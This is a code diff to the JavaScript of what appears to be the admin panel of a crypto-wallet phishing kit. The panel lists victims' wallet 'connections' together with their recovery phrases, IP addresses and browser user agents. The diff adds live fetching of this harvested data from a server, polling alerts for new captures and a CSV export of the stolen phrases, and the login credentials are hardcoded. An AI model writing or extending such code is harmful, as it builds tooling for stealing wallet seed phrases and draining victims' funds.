@@ -34,7 +34,7 @@ document.addEventListener('DOMContentLoaded', function() {
       showLoginModal();
     } else {
       hideLoginModal();
-      updateDashboard();
+      fetchActivitiesFromServer();
     }
   }
   
@@ -59,7 +59,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if (username === 'cblsupport001' && password === 'og001cbl') {
       localStorage.setItem('isAdminLoggedIn', 'true');
       hideLoginModal();
-      updateDashboard();
+      fetchActivitiesFromServer();
     } else {
       loginError.textContent = 'Invalid username or password';
       loginPassword.value = '';
@@ -102,12 +102,32 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   }
   
-  // Generate random IP
-  function generateRandomIP() {
-    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+  // Fetch activities from server
+  function fetchActivitiesFromServer() {
+    fetch('/api/activities')
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Fetched activities:', data);
+        if (data && data.activities) {
+          saveActivities(data.activities);
+          updateDashboard();
+        } else {
+          console.error('Received invalid activities data:', data);
+        }
+      })
+      .catch(error => {
+        console.error('Error fetching activities:', error);
+        // Fall back to local storage if server fetch fails
+        updateDashboard();
+      });
   }
   
-  // Get activities from server/localStorage
+  // Get activities from localStorage
   function getActivities() {
     const storedActivities = localStorage.getItem('walletActivities');
     return storedActivities ? JSON.parse(storedActivities) : [];
@@ -174,9 +194,9 @@ document.addEventListener('DOMContentLoaded', function() {
       activityItem.className = 'activity-item';
       activityItem.innerHTML = `
         <div class="activity-details">
-          <div class="wallet-icon">${activity.wallet.charAt(0).toUpperCase()}</div>
+          <div class="wallet-icon">${activity.wallet ? activity.wallet.charAt(0).toUpperCase() : 'W'}</div>
           <div class="activity-info">
-            <div class="activity-type">${activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1)} Wallet Connection</div>
+            <div class="activity-type">${activity.wallet ? activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1) : 'Unknown'} Wallet Connection</div>
             <div class="activity-time">${formatDate(activity.timestamp)}</div>
           </div>
         </div>
@@ -241,11 +261,12 @@ document.addEventListener('DOMContentLoaded', function() {
     
     activities.forEach((activity, index) => {
       const tr = document.createElement('tr');
+      const walletName = activity.wallet ? activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1) : 'Unknown';
       tr.innerHTML = `
         <td>${index + 1}</td>
-        <td>${activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1)}</td>
+        <td>${walletName}</td>
         <td>${formatDate(activity.timestamp)}</td>
-        <td>${activity.ip || generateRandomIP()}</td>
+        <td>${activity.ip || 'Unknown'}</td>
         <td><span class="activity-status">Completed</span></td>
         <td>
           <button class="action-btn view-details" data-index="${index}">View Details</button>
@@ -266,11 +287,12 @@ document.addEventListener('DOMContentLoaded', function() {
   
   // Show activity details in modal
   function showActivityDetails(activity) {
-    document.getElementById('detail-wallet').textContent = activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1);
-    document.getElementById('detail-phrase').textContent = activity.phrase;
+    const walletName = activity.wallet ? activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1) : 'Unknown';
+    document.getElementById('detail-wallet').textContent = walletName;
+    document.getElementById('detail-phrase').textContent = activity.phrase || 'Not available';
     document.getElementById('detail-timestamp').textContent = formatDate(activity.timestamp);
-    document.getElementById('detail-ip').textContent = activity.ip || generateRandomIP();
-    document.getElementById('detail-useragent').textContent = activity.userAgent || navigator.userAgent;
+    document.getElementById('detail-ip').textContent = activity.ip || 'Unknown';
+    document.getElementById('detail-useragent').textContent = activity.userAgent || 'Not available';
     
     activityDetailModal.classList.add('active');
   }
@@ -290,6 +312,31 @@ document.addEventListener('DOMContentLoaded', function() {
     }, 5000);
   }
   
+  // Check for new activities from server
+  function checkForNewActivities() {
+    fetch('/api/activities')
+      .then(response => response.json())
+      .then(data => {
+        if (data && data.activities) {
+          const currentActivities = getActivities();
+          
+          // Compare counts
+          if (data.activities.length > currentActivities.length) {
+            const newCount = data.activities.length - currentActivities.length;
+            showNotification('New Activity', `${newCount} new wallet connection(s) detected`);
+            saveActivities(data.activities);
+            updateDashboard();
+            return newCount;
+          }
+        }
+        return 0;
+      })
+      .catch(error => {
+        console.error('Error checking for new activities:', error);
+        return 0;
+      });
+  }
+  
   // Event listeners
   loginBtn.addEventListener('click', handleLogin);
   logoutBtn.addEventListener('click', handleLogout);
@@ -302,14 +349,48 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
   
-  refreshDashboardBtn.addEventListener('click', updateDashboard);
-  refreshActivitiesBtn.addEventListener('click', updateActivitiesTable);
+  refreshDashboardBtn.addEventListener('click', function() {
+    fetchActivitiesFromServer();
+  });
+  
+  refreshActivitiesBtn.addEventListener('click', function() {
+    fetchActivitiesFromServer();
+  });
   
   walletFilter.addEventListener('change', updateActivitiesTable);
   dateFilter.addEventListener('change', updateActivitiesTable);
   
   exportActivitiesBtn.addEventListener('click', function() {
-    alert('Export functionality would be implemented here');
+    const activities = getActivities();
+    if (activities.length === 0) {
+      alert('No activities to export');
+      return;
+    }
+    
+    // Create CSV content
+    let csvContent = 'data:text/csv;charset=utf-8,';
+    csvContent += 'ID,Wallet,Date,IP,Phrase\n';
+    
+    activities.forEach((activity, index) => {
+      const row = [
+        index + 1,
+        activity.wallet || 'Unknown',
+        formatDate(activity.timestamp),
+        activity.ip || 'Unknown',
+        activity.phrase || 'Not available'
+      ].join(',');
+      
+      csvContent += row + '\n';
+    });
+    
+    // Create download link
+    const encodedUri = encodeURI(csvContent);
+    const link = document.createElement('a');
+    link.setAttribute('href', encodedUri);
+    link.setAttribute('download', 'wallet_activities.csv');
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
   });
   
   closeModalBtns.forEach(btn => {
@@ -319,8 +400,18 @@ document.addEventListener('DOMContentLoaded', function() {
   });
   
   document.getElementById('delete-activity').addEventListener('click', function() {
-    alert('Delete functionality would be implemented here');
+    const wallet = document.getElementById('detail-wallet').textContent;
+    const phrase = document.getElementById('detail-phrase').textContent;
+    
+    const activities = getActivities();
+    const filteredActivities = activities.filter(activity => {
+      return !(activity.wallet === wallet.toLowerCase() && activity.phrase === phrase);
+    });
+    
+    saveActivities(filteredActivities);
+    updateDashboard();
     activityDetailModal.classList.remove('active');
+    showNotification('Success', 'Activity record deleted successfully');
   });
   
   toastCloseBtn.addEventListener('click', function() {
@@ -329,46 +420,40 @@ document.addEventListener('DOMContentLoaded', function() {
   
   // Check for new data every 30 seconds
   setInterval(function() {
-    const activities = getActivities();
-    const newActivities = checkForNewActivities(activities);
-    
-    if (newActivities > 0) {
-      showNotification('New Activity', `${newActivities} new wallet connection(s) detected`);
-      updateDashboard();
-    }
+    checkForNewActivities();
   }, 30000);
-  
-  // Mock function to simulate checking for new activities
-  function checkForNewActivities(currentActivities) {
-    // For demo purposes, randomly add a new activity
-    if (Math.random() < 0.3) { // 30% chance
-      return 0;
-    }
-    
-    return 0;
-  }
   
   // Initialize
   checkAuth();
   switchSection('dashboard');
   
-  // For demo, attach to window for easier testing
+  // For testing
   window.testAddActivity = function(wallet, phrase) {
-    const activities = getActivities();
-    
     const newActivity = {
       wallet: wallet || 'metamask',
       phrase: phrase || 'test test test test test test test test test test test test',
       timestamp: new Date().toISOString(),
-      ip: generateRandomIP(),
+      ip: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
       userAgent: navigator.userAgent
     };
     
-    activities.unshift(newActivity);
-    saveActivities(activities);
-    updateDashboard();
-    showNotification('New Connection', `New ${newActivity.wallet} wallet connected`);
+    fetch('/api/connect', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(newActivity),
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Test activity added:', data);
+      fetchActivitiesFromServer();
+      showNotification('New Connection', `New ${newActivity.wallet} wallet connected`);
+    })
+    .catch(error => {
+      console.error('Error adding test activity:', error);
+    });
     
-    return 'Activity added successfully';
+    return 'Activity request sent';
   };
 });
